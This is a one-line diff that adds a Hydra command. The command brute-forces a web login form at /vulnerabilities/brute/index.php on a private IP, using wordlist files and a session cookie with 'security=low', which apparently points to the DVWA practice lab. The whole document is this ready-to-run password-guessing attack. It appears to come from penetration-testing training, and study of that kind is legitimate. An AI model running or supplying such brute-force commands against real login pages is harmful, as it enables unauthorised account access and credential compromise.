@@ -1,0 +1,1 @@
+hydra 10.2.0.133:8079 -l /root/admin.txt -P /root/admin.txt http-get-form “/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=p512f9sp7rbs9kki3m46c0ark5; security=low”
